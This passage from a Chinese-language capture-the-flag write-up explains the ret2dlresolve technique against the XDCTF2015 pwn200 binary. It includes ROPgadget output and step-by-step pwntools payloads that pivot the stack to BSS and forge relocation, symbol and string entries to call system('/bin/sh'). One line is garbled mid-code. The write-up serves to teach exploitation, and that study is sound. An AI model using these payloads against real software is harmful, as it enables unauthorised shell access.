  4. .dynstr + sym->st_name得出符号字符串指针。
  5. 在动态链接库查找该函数地址，并将地址赋值给*rel->r_offset，即GOT表。
  6. 调用该函数。
第二个过程中，若能控制reloc_arg，可以使rel指向一个可读写的区域，例如bss；  
第三个过程中，我们只要在伪造的rel内部放一个r_info，即可控制sym，一般r_info设置为0xXXXXXX07，其中XXXXXX为相对.dynsym的下标(不是偏移)，下标一般是offset/0x10(32位)，导入函数一般是07，因此用07结尾；  
第四个过程中，没有检查，所以字符串也可伪造。
看个例题XDCTF2015_pwn200:
栈溢出，可以利用的只有write、read，strlen等函数，这个题其实用普通ret2libc也是ok的。  
Partial RELRO，dynamic不可写。
1、栈迁移到BSS段
    root@16-223:/pwn/ret2dlresolve# ROPgadget --binary bof --only "pop|ret"
    Gadgets information
    ============================================================
    0x0804862b : pop ebp ; ret
    0x08048628 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
    0x0804836d : pop ebx ; ret
    0x0804862a : pop edi ; pop ebp ; ret
    0x08048629 : pop esi ; pop edi ; pop ebp ; ret
    0x08048356 : ret
    0x0804846e : ret 0xeac1
    Unique gadgets found: 7
    root@16-223:/pwn/ret2dlresolve# ROPgadget --binary bof --only "leave|ret"
    Gadgets information
    ============================================================
    0x08048445 : leave ; ret
    0x08048356 : ret
    0x0804846e : ret 0xeac1
    Unique gadgets found: 3
    read = elf.plt['read']
        write = elf.plt['write']
        bss = elf.bss() + 0x800
        pop_esi_edi_ebp_ret = 0x08048619
        leave_ret = 0x08048458
        pop_ebp_ret = 0x0804861b
        vuln = 0x080484D6
        gdb.attach(p,"b *0x08048519")
        payload = b'A' * 112 + p32(read) + p32(pop_esi_edi_ebp_ret) + p32(0) + p32(bss) + p32(0x80)
        payload+= p32(pop_ebp_ret) + p32(bss) + p32(leave_ret)
        sda("XDCTF2015~!\n",payload)
        sleep(2)
        payload = b'BBBB'
        payload+= p32(write) + p32(0) + p32(1) + p32(bss+0x50) + p32(0x8)
        payload = payload.ljust(0x50,b'\x00') + b'/bin/sh\x00'
        payload = payload.ljust(0x80,b'\x00')
        sd(payload)
emm，一开始buu下的bof怎么都不执行write，后面调试发现不对劲...最后还是自己编译的ok。  
3个pop的原理很简单，执行完read(0,bss,0x80)后，三个参数还在栈上，因此需要3个pop弹出从而继续执行下面的pop_ebp_ret。  
为什么需要pop_ebp_ret呢，是因为3个pop的最后一个是pop_ebp，因此为了让ebp为bss的地址，需要再执行一个pop_ebp_ret。
2、控制程序执行plt_0的相关指令  
push link_map以及跳转到_dl_runtime_resolve。还需要提供write重定位表项在GOT表中的偏移，
plt:（objdump -d -j .plt bof1）
因此plt_0 = 0x08048380，write_index_offset = 0x20 `80483c6: 68 20 00 00 00 push
$0x20`
GOT 表的第 0 项（本例中 0x804a004）存储的就是 link_map 的地址。  
plt[0]的目的就是执行push以及jmp resolve，push的就是link_map，用0x20作为offset。
    sleep(2)
        plt_0 = 0x08048380
        write_index_offset = 0x20
        payload = b'BBBB'
        payload+= p32(plt_0) + p32(write_index_offset) + p32(0) + p32(1) + p32(bss+0x50) + p32(0x8)
        #payload+= p32(write) + p32(0) + p32(1) + p32(bss+0x50) + p32(0x8)
        payload = payload.ljust(0x50,b'\x00') + b'/bin/sh\x00'
        payload = payload.ljust(0x80,b'\x00')
        sd(payload)
3、还是执行plt_0，这次控制offset指向我们伪造的地址
r_info:（readelf -r bof1）
因此write_rinfo = 0x0000607
rel.plt:（objdump -s -j .rel.plt bof1）
rel_plt = 0x8048330
    sleep(2)
        plt_0 = 0x08048380
        write_rinfo = 0x0000607
        rel_plt = 0x8048330
        index_offset = bss + 0x60 - rel_plt
        write_got = elf.got['write']
        payload = b'BBBB'
        payload+= p32(plt_0) + p32(index_offset) + p32(0) + p32(1) + p32(bss+0x50) + p32(0x8)
        #payload+= p32(write) + p32(0) + p32(1) + p32(bss+0x50) + p32(0x8)
        payload = payload.ljust(0x50,b'\x00') + b'/bin/sh\x00'
        payload = payload.ljust(0x60,b'\x00') + p32(write_got) + p32(write_rinfo)
        payload = payload.ljust(0x80,b'\x00')
        sd(payload)
我们在bss + 0x60的地方伪造了重定位表，仍然还是write，可以看到输出了字符串。
4、伪造sym，使其指向我们控制的st_name
st_name = 0x4c
    #sleep(2)
        plt_0 = 0x08048380
        write_rinfo = 0x0000607
        rel_plt = 0x8048330
        index_offset = bss + 0x30 - rel_plt
        write_got = elf.got['write']
        dynsym = 0x80481D8
        dynstr = 0x8048278
        fake_sym_address = bss + 0x60
        align = 0x10 - ((fake_sym_address - dynsym) & 0xf)
        fake_sym_address = fake_sym_address + align
        write_rinfo = int((fake_sym_address - dynsym) / 0x10)
        write_rinfo = (write_rinfo r_info计算出我们伪造的dynsym下标。
  3. 根据伪造的dymsym下标拿到st_name
这里我调整了一下fake_rel(bss+0x30)以及fake_sym(bss+0x60)的位置
5、伪造st_name  
那么接下来，只要伪造st_name，即可getshell。  
考虑直接在/bin/sh字符串后面，因为还有空间.
    fake_sym_address = bss + 0x60
        align = 0x10 - ((fake_sym_address - dynsym) & 0xf)
        fake_sym_address = fake_sym_address + align
        write_rinfo = int((fake_sym_address - dynsym) / 0x10)
        write_rinfo = (write_rinfo << 8) | 0x7
        st_name = (bss + 0x50 + 0x8) - dynstr
        payload = b'BBBB'
        payload+= p32(plt_0) + p32(index_offset) + p32(0) + p32(bss+0x50)
        payload = payload.ljust(0x30,b'\x00') + p32(write_got) + p32(write_rinfo)
        #payload+= p32(write) + p32(0) + p32(1) + p32(bss+0x50) + p32(0x8)
        payload = payload.ljust(0x50,b'\x00') + b'/bin/sh\x00' + b'system\x00'
        payload = payload.ljust(0x60,b'\x00') + b'B' * align + p32(st_name) + p32(0) + p32(0) + p32(0x12)
        payload = payload.ljust(0x80,b'\x00')
        sd(payload)
最终payload:
    from pwn import *
    from LibcSearcher import *
    context.terminal = ["tmux","splitw","-h"]
    context(arch='amd64',os='linux',log_level='debug')